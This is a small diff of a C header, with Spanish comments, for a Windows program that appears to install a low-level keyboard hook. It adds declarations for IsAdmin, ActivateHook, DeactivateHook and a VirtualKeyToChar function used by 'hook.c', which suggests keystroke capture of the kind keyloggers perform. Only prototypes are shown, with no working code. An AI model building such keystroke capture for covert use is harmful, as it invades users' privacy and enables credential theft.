@@ -16,6 +16,8 @@
 
 	#include <windows.h>
 	#include <stdio.h>
+	#include <errno.h>
+	#include <time.h>
 
 #pragma endregion
 
@@ -28,9 +30,13 @@
 
 #pragma region "Methods"
 
-	// Aqui van los métodos
+	// llamadas desde el main
+	BOOL IsAdmin(void);
 	BOOL ActivateHook(void);
 	void DeactivateHook(void);
-	LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
+
+	// llamada desde hook.c
+	char* VirtualKeyToChar(DWORD vkCode);
+	
 
 #pragma endregion
